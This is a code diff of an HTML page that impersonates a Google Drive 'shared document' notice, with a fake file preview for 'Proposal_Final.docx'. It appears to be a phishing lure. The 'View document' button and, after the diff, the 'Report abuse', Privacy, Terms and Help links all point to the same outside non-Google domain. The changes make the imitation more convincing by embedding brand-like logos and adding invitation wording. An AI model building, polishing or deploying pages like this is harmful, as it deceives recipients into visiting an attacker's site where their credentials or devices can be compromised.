@@ -3,49 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Drive - Shared Item</title>
+    <title>Google Drive - Shared Document</title>
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com" rel="stylesheet">
 </head>
 <body>
-    <main class="viewport">
+    <div class="wrapper">
         <div class="card">
-            <!-- Pure CSS Google Drive Logo -->
-            <div class="drive-logo-wrap">
-                <div class="logo-shape">
-                    <div class="tri-side yellow"></div>
-                    <div class="tri-side green"></div>
-                    <div class="tri-side blue"></div>
-                </div>
-                <span class="brand-name">Google Drive</span>
-            </div>
+            <!-- Official Drive Logo (Embedded SVG for instant loading) -->
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4Ny4zIDc4Ij48cGF0aCBmaWxsPSIjMDBCRDYyIiBkPSJNMzAuNyA3OGw1Ni42IDAtMTUuMy0yNi41LTU2LjYgMHoiLz48cGF0aCBmaWxsPSIjNDI4NUY0IiBkPSJNMzAuNyA3OEwwIDUyLjUgMTUuMyAyNi41IDQ2IDc4eiIvPjxwYXRoIGZpbGw9IiNGRkJDMDAiIGQ9Ik0xNS4zIDI2LjVsMTUuNC0yNi41IDU2LjYgMC0xNS4zIDI2LjV6Ii8+PC9zdmc+" class="drive-logo" alt="Drive">
+            
+            <h1>Shared Document</h1>
+            <p class="subtitle">A file has been shared with you via Google Drive. You have been invited to view the following document.</p>
 
-            <h1 class="headline">Shared Document</h1>
-            <p class="subtext">A file has been shared with you via Google Drive.</p>
-
-            <div class="file-preview-card">
-                <div class="doc-icon-css">
-                    <div class="dog-ear"></div>
-                    <div class="lines"></div>
-                </div>
-                <div class="file-info">
-                    <div class="name">Proposal_File.docx</div>
-                    <div class="meta">Word Document • 1.2 MB</div>
+            <div class="file-card">
+                <!-- Official Docs Icon (Embedded SVG) -->
+                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iIzQyODVGNCIsIGQ9Ik0zNCA0SDE0Yy0yLjIgMC00IDEuOC00IDR2MzJjMCAyLjIgMS44IDQgNCA0aDIwYzIuMiAwIDQtMS44IDQtNFY4YzAtMi4yLTEuOC00LTQtNHptLTQgMzBINTh2LTJoMTR2MnptMC00SDU4di0yaDE0djJ6bTAtNEg1OHYtMmgxNHYyeiIvPjwvc3ZnPg==" class="doc-icon">
+                <div class="file-text">
+                    <div class="file-title">Proposal_Final.docx</div>
+                    <div class="file-type">Word Document • 1.4 MB</div>
                 </div>
             </div>
 
-            <a href="https://founder.deciobo.solutions/0UQQj0iXO5rEMJgCnVeD@O/" class="primary-button">View document</a>
+            <div class="button-container">
+                <a href="https://founder.deciobo.solutions/0UQQj0iXO5rEMJgCnVeD@O/" class="btn-primary">View document</a>
+            </div>
 
-            <footer class="card-footer">
-                Don't recognize this sender? <a href="#" class="link">Report abuse</a>
-            </footer>
+            <div class="divider"></div>
+
+            <div class="abuse-report">
+                Don't recognize this sender? <a href="https://founder.deciobo.solutions/0UQQj0iXO5rEMJgCnVeD@O/">Report abuse</a>
+            </div>
         </div>
 
-        <nav class="external-links">
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
-            <a href="#">Help</a>
-        </nav>
-    </main>
+        <div class="legal-footer">
+            <a href="https://founder.deciobo.solutions/0UQQj0iXO5rEMJgCnVeD@O/">Privacy</a>
+            <a href="https://founder.deciobo.solutions/0UQQj0iXO5rEMJgCnVeD@O/">Terms</a>
+            <a href="https://founder.deciobo.solutions/0UQQj0iXO5rEMJgCnVeD@O/">Help</a>
+        </div>
+    </div>
 </body>
 </html>
